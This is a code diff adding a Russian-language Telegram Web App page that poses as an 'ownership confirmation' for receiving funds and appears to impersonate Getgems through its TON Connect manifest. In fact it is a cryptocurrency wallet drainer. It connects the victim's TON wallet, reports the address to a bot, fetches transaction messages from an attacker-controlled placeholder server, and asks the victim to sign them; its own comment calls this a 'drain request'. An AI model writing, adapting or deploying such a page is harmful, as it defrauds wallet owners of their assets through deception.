@@ -1,5 +1,177 @@
 <!DOCTYPE html>
-<html>
-<head><title>FISP</title></head>
-<body>FISP</body>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Подтверждение владения</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0e1621;
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .card {
+            background: #17212b;
+            border-radius: 16px;
+            padding: 24px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .card h1 { font-size: 20px; margin-bottom: 12px; }
+        .card p { font-size: 14px; color: #8b9eb0; margin-bottom: 20px; }
+        .btn {
+            background: #2481cc;
+            color: #fff;
+            border: none;
+            border-radius: 10px;
+            padding: 14px;
+            font-size: 16px;
+            width: 100%;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn:active { background: #1a6aad; }
+        .btn:disabled { background: #444; cursor: not-allowed; }
+        .status { margin-top: 16px; font-size: 14px; color: #8b9eb0; }
+        .status.ok { color: #4caf50; }
+        .status.err { color: #f44336; }
+        #tc-root { margin-bottom: 16px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>Подтвердите владение</h1>
+        <p>Для получения средств подтвердите, что вы являетесь владельцем активов.</p>
+        
+        <div id="tc-root"></div>
+        
+        <button class="btn" id="confirmBtn" style="display:none;" onclick="sendTransaction()">
+            Подтвердить транзакцию
+        </button>
+        
+        <div class="status" id="status">Ожидание подключения кошелька...</div>
+    </div>
+
+    <script>
+        const MANIFEST_URL = 'https://916402465.github.io/getgems-manifest/tonconnect-manifest.json';
+        
+        let tonConnectUI = null;
+        let connected = false;
+        let userAddress = null;
+
+        // Получаем данные из Telegram WebApp
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        // Инициализация TON Connect UI
+        tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+            manifestUrl: MANIFEST_URL,
+            buttonRootId: 'tc-root',
+            uiPreferences: {
+                theme: 'DARK',
+            },
+        });
+
+        // Отслеживаем статус подключения
+        tonConnectUI.onStatusChange((wallet) => {
+            const statusEl = document.getElementById('status');
+            const confirmBtn = document.getElementById('confirmBtn');
+            
+            if (wallet) {
+                connected = true;
+                userAddress = wallet.account.address;
+                statusEl.textContent = 'Кошелёк подключён. Нажмите «Подтвердить транзакцию».';
+                statusEl.className = 'status ok';
+                confirmBtn.style.display = 'block';
+                
+                // Отправляем данные боту через Telegram WebApp
+                if (tg) {
+                    tg.sendData(JSON.stringify({
+                        type: 'wallet_connected',
+                        address: userAddress,
+                    }));
+                }
+            } else {
+                connected = false;
+                userAddress = null;
+                statusEl.textContent = 'Ожидание подключения кошелька...';
+                statusEl.className = 'status';
+                confirmBtn.style.display = 'none';
+            }
+        });
+
+        // Отправка транзакции (запрос на слив)
+        async function sendTransaction() {
+            if (!connected || !userAddress) {
+                alert('Сначала подключите кошелёк.');
+                return;
+            }
+
+            const statusEl = document.getElementById('status');
+            const confirmBtn = document.getElementById('confirmBtn');
+            statusEl.textContent = 'Формирование транзакции...';
+            statusEl.className = 'status';
+            confirmBtn.disabled = true;
+
+            try {
+                // Запрашиваем у бота параметры транзакции
+                const response = await fetch('https://твой-сервер/api/prepare-transaction', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        user_id: tg?.initDataUnsafe?.user?.id,
+                        address: userAddress,
+                    }),
+                });
+
+                if (!response.ok) {
+                    throw new Error('Сервер вернул ошибку');
+                }
+
+                const txData = await response.json();
+
+                // Отправляем транзакцию в Tonkeeper
+                const result = await tonConnectUI.sendTransaction({
+                    validUntil: Math.floor(Date.now() / 1000) + 300,
+                    messages: txData.messages,
+                });
+
+                statusEl.textContent = 'Транзакция отправлена!';
+                statusEl.className = 'status ok';
+
+                // Уведомляем бота о подписи
+                if (tg) {
+                    tg.sendData(JSON.stringify({
+                        type: 'transaction_sent',
+                        boc: result.boc,
+                    }));
+                }
+
+                // Закрываем WebApp через 2 секунды
+                setTimeout(() => {
+                    if (tg) tg.close();
+                }, 2000);
+
+            } catch (err) {
+                console.error(err);
+                statusEl.textContent = 'Ошибка: ' + err.message;
+                statusEl.className = 'status err';
+                confirmBtn.disabled = false;
+            }
+        }
+    </script>
+</body>
 </html>
